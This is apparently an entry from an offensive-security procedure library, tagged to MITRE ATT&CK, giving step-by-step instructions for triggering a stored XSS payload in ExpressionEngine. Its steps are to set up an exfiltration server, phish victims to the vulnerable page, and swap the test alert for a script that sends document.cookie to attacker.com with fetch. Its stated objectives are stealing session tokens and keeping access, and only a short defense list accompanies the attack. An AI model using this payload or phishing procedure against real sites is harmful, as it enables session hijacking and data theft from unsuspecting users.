---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567892
tags:
  - xss
  - execution
  - javascript
  - expressionengine
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:25.221Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-Execution-in-User-Browsers

## Summary

This procedure triggers the execution of the stored XSS payload in the browsers of targeted users by directing them to the vulnerable page, enabling arbitrary JavaScript to run in their session context for theft or manipulation.

## Description

Once a stored XSS payload is injected into ExpressionEngine, it remains dormant until rendered in a user's browser. This procedure involves social engineering to lure victims to the page or leveraging site traffic. Execution occurs client-side, allowing access to cookies, local storage, or DOM manipulation. Impacts include session hijacking or keylogging, with the attack persisting until the payload is removed.

## Requirements

1. Successful injection of XSS payload from prior procedure
2. Method to direct users to the affected URL (e.g., email, link sharing)
3. Victim must load the page in a browser without XSS protections

## Defense

Defensive measures and detection strategies:

- Deploy browser-based protections like XSS auditors or extensions
- Sanitize all outputs dynamically before rendering
- Log and alert on unusual client-side script executions

## Objectives

1. Execute JavaScript in victim browser context
2. Exfiltrate sensitive data like session tokens
3. Maintain access for further persistence

## Instructions

### Step 1: Prepare Exfiltration Endpoint

**Context**: Set up a server to receive stolen data from the payload.

Use a simple HTTP listener or webhook service to capture data sent by the payload.

### Step 2: Lure Victim to Vulnerable Page

**Context**: Direct the target to the page containing the stored payload.

Send a phishing email or message with the URL: `https://target.com/vulnerable-page`.

> The payload executes automatically upon page load in the victim's browser.

### Step 3: Monitor Execution and Data Theft

**Context**: Observe the effects of the executed script.

Replace alert with exfiltration like: `<script>fetch('http://attacker.com/steal?cookie='+document.cookie);</script>`.

> Expected output: Data received at attacker endpoint, confirming execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- execution
